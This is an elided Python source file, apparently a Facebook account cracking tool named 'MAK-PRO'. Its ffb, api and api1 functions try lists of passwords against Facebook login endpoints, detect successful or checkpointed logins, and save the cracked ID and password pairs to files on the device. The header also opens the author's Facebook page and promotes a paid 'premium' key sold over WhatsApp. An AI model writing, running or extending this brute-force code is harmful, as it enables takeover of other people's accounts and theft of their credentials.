...
#Re Created By MAK GANG
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://facebook.com/mursalinahamedkhanalin')
...
----------------------------------------------
 Author    : MURSALIN AHAMED KHAN
 Github    : MAK-GANG
 Facebook  : mursalinahamedkhanalin
 Tool Name : MAK-PRO
 TOOLS type : FREE FOR 21-23DEC
 Version   : 2.3.0
----------------------------------------------
MAK Pro version 2.3.0
 For Haters: IF YOU LOVE ME I LOVE YOUðŸ˜½.IF YOU HATE ME I FUCK YOUðŸ˜ˆ
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801870830179&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Aking Sir, I Need To Buy Your Paid MAK PRO Tools Version 2.3.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MAK-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [MAK-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MAK-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MAK-GANG-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MAK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [MAK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MAK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MAK-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MAK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [MAK-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MAK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MAK-OK] '+uid+' | '+pas+'\033[1;97m')
